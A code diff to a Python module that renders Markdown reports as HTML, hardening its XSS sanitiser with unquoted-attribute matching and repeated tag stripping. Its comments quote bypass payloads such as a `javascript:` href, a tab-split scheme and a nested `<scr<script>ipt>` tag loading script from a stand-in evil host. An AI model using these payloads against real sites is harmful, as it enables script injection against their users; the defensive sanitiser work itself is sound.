@@ -1,21 +1,11 @@
 """报告 Markdown → HTML 页面(服务端渲染)。
 
-只产出字符串:不 import FastAPI、不认识 HTTP。状态码、缓存头、路由由 `api_server` 决定,
-所以这里的每个函数都能在测试里直接调,不用起服务。
+只产出字符串,不认识 HTTP:状态码、缓存头、路由由 `api_server` 决定。结构化榜单走主从
+布局、每个字段单独 escape;其余 .md 退回通用 Markdown 渲染,那条路径要额外清洗原始 HTML。
 
-## 两条渲染路径,不是冗余
-
-`core.report_parse` 能解析出来的结构化榜单走主从布局(侧栏项目列表 + 详情面板),每个字段
-单独 escape 后拼进 HTML。其余 .md(说明、随手记)才退回通用 Markdown 渲染,那条路径要额外
-做清洗,因为 markdown 库会把文件里的原始 HTML 原样透传。
-
-## 转义与白名单是本模块的第一职责
-
-榜单里的仓库名、主题标签、LLM 写的描述全部来自外部。凡是拼进 HTML 的都过 `escape`,
-凡是进 href/src 的都过 `_is_safe_url` 的协议白名单。这两道是安全边界,不是代码风格。
-
-class 名和 DOM 形状被 `web/report.css` 与 `web/report.js` 按名字依赖。改名字不会报错,
-只会静默错版 —— 所以这里的 HTML 字面量是接口,不是实现细节。
+榜单内容全部来自外部:凡是拼进 HTML 的都过 `escape`,凡是进 href/src 的都过 `_is_safe_url`
+协议白名单 —— 这是安全边界,不是代码风格。class 名和 DOM 形状被 report.css / report.js
+按名字依赖,改名不会报错,只会静默错版。
 """
 
 from __future__ import annotations
@@ -50,8 +40,7 @@ _EMPTY_TOC = '<p class="toc-empty">当前报告暂无可跳转目录。</p>'
 def _asset_path(path_name: str) -> Path:
     """web 目录下的资源路径。越出目录的名字一律当「资源不存在」。
 
-    名字目前都来自调用方的常量,但拼路径的地方就在这里:挡住穿越只要两行,
-    而漏了它以后谁把请求里的文件名接进来,就变成任意文件读取。
+    挡住穿越只要两行,漏了它以后谁把请求里的文件名接进来,就变成任意文件读取。
     """
     root = config.WEB_DIR.resolve()
     path = (root / path_name).resolve()
@@ -61,10 +50,7 @@ def _asset_path(path_name: str) -> Path:
 
 
 def asset_text(path_name: str) -> str:
-    """读 web 目录里的文本资源。
-
-    读不到就让 OSError 冒出去,由 `api_server` 翻成 HTTP 状态码 —— 本模块不认识状态码。
-    """
+    """读 web 目录里的文本资源。读不到就让 OSError 冒出去,由 `api_server` 翻成状态码。"""
     return _asset_path(path_name).read_text(encoding="utf-8")
 
 
@@ -72,8 +58,7 @@ def asset_text(path_name: str) -> str:
 def _asset_version() -> str:
     """web 目录的指纹,拼在 css/js 的 `?v=` 上,让浏览器只在文件真的改了之后才重新下载。
 
-    一个进程只算一次(算它要 stat 整个目录),运行中改了静态文件就重启服务,和旧行为一致。
-    子目录(vendor/)不参与:第三方库自带版本号,不该跟着我们的改动整体失效。
+    一个进程只算一次,运行中改了静态文件就重启服务。子目录(vendor/)不参与。
     """
     digest = hashlib.md5(usedforsecurity=False)
     root = config.WEB_DIR
@@ -86,8 +71,7 @@ def _asset_version() -> str:
 def page(path_name: str, replacements: dict[str, str]) -> str:
     """占位符模板 → 最终 HTML,`__ASSET_VER__` 总是自动补上(调用方给了则用调用方的)。
 
-    不改调用方传进来的字典:旧版直接在参数上 setdefault,调用方复用同一个字典时会带上
-    上一次渲染的残留值。
+    不改调用方传进来的字典 —— 复用同一个字典时会带上上一次渲染的残留值。
     """
     document = asset_text(path_name)
     for placeholder, value in {"__ASSET_VER__": _asset_version(), **replacements}.items():
@@ -103,8 +87,11 @@ _SAFE_SCHEMES = frozenset({"http", "https", "mailto"})
 _RELATIVE_PREFIXES = ("#", "/", "./", "../", "//")
 _SCHEME = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.-]*):")
 _CTRL = re.compile(r"[\x00-\x20]+")
+# 无引号那一支不能省:原文里直接写的 `<a href=javascript:alert(1)>` 会原样穿过渲染,
+# 只认带引号的等于放它过去。
 _URL_ATTR = re.compile(
-    r'(?P<attr>\b(?:href|src))\s*=\s*(?P<quote>["\'])(?P<value>.*?)(?P=quote)',
+    r'(?P<attr>\b(?:href|src))\s*=\s*'
+    r'(?:(?P<quote>["\'])(?P<quoted>.*?)(?P=quote)|(?P<bare>[^\s>]+))',
     re.IGNORECASE,
 )
 
@@ -112,10 +99,8 @@ _URL_ATTR = re.compile(
 def _is_safe_url(url: str) -> bool:
     """只放行 http / https / mailto 与站内相对链接,`javascript:` `data:` 一律拦掉。
 
-    判之前要先 unescape 再抹掉控制字符:`java&#09;script:alert(1)` 和协议名中间夹换行的
-    写法,浏览器都当 javascript 协议执行,只看原串会漏。抹掉只是为了判断,输出仍是原串。
-
-    取不出协议(相对路径、锚点、纯文件名)一律放行 —— 它们不可能触发协议处理器。
+    判之前要先 unescape 再抹掉控制字符:`java&#09;script:alert(1)` 这类写法浏览器照样当
+    javascript 协议执行,只看原串会漏(抹掉只为判断,输出仍是原串)。取不出协议的一律放行。
     """
     normalized = unescape(url or "").strip()
     if not normalized:
@@ -139,13 +124,14 @@ def _sanitize_urls(html_text: str) -> str:
     """
 
     def replace(match: re.Match[str]) -> str:
-        if _is_safe_url(match.group("value")):
+        quote = match.group("quote")
+        value = match.group("quoted") if quote else match.group("bare")
+        if _is_safe_url(value):
             return match.group(0)
         # href 换成锚点(点了什么也不发生),src 只能清空 —— 给 src 塞 "#" 会让浏览器
-        # 重新请求当前页面。
+        # 重新请求当前页面。重写时一律补上引号,免得裸值里的空格把后面的内容拆成新属性。
         fallback = "#" if match.group("attr").lower() == "href" else ""
-        quote = match.group("quote")
-        return f'{match.group("attr")}={quote}{fallback}{quote}'
+        return f'{match.group("attr")}="{fallback}"'
 
     return _URL_ATTR.sub(replace, html_text)
 
@@ -522,8 +508,10 @@ def _summary_chips(summary: str, extra_chips: list[str] | None = None) -> str:
 # 属性得在进渲染器之前就抹掉。结构化榜单那条路径不需要这一步 —— 那边每个字段单独 escape。
 #
 # 正则清洗是钝器:它抹掉的是这几个已知标签和 on* 属性,不是完备的 HTML 消毒(`onerror=x`
-# 被抹成裸的 `x`,标签本身还在)。够用的前提是这条路径只渲染我们自己写进 report/ 的文件,
-# 没有用户投稿。哪天要渲染外部来源的 md,这里得换成真正的白名单清洗器。
+# 被抹成裸的 `x`,标签本身还在)。且 report/ 里的内容并非全都出自我们之手 —— agent 的报告
+# 保存工具是聊天驱动的,提示词里让它写什么它就写什么。所以这里按"内容不可信"对待:
+# ponytail: 黑名单清洗,不是白名单。撑得住已知向量(见 test_web.py 的探针集),但下一个
+# 没想到的形态就是下一个洞。真正的修法是换 nh3/bleach 做白名单,代价是多一个依赖。
 
 _RAW_TAG_PAIR = re.compile(
     r"<(script|iframe|object|embed|form|input|style)[^>]*>.*?</\1>",
@@ -534,15 +522,27 @@ _RAW_TAG = re.compile(
 )
 _EVENT_ATTR = re.compile(r"\bon\w+\s*=", re.IGNORECASE)
 
+# 替换一次不够:删掉内层匹配后,剩下的两截会重新拼成一个新标签。实测
+# `<scr<script>ipt src=http://evil/x.js>` 单次清洗后会渲染出可执行的外链 script。
+# 每轮只做删除,所以文本严格变短,必然收敛;给个上限是防着有人拿深嵌套刷 O(n²)。
+_MAX_CLEAN_PASSES = 8
+
+
+def _clean_raw_html(text: str) -> str:
+    for _ in range(_MAX_CLEAN_PASSES):
+        cleaned = _EVENT_ATTR.sub("", _RAW_TAG.sub("", _RAW_TAG_PAIR.sub("", text)))
+        if cleaned == text:
+            return cleaned
+        text = cleaned
+    return escape(text)     # 收敛不了就整篇转义:宁可显示成源码,也不把它交给浏览器
+
 
 def _plain_page(name: str, markdown: str) -> str:
     lines = markdown.splitlines()
     title = next((ln[2:].strip() for ln in lines if ln.startswith("# ")), name)
     summary = next((ln[1:].strip() for ln in lines if ln.startswith(">")), "")
 
-    text = _RAW_TAG_PAIR.sub("", markdown)
-    text = _RAW_TAG.sub("", text)
-    text = _EVENT_ATTR.sub("", text)
+    text = _clean_raw_html(markdown)
 
     md = Markdown(extensions=["extra", "sane_lists", "toc", "nl2br"], output_format="html5")
     article_html = _sanitize_urls(md.convert(text))
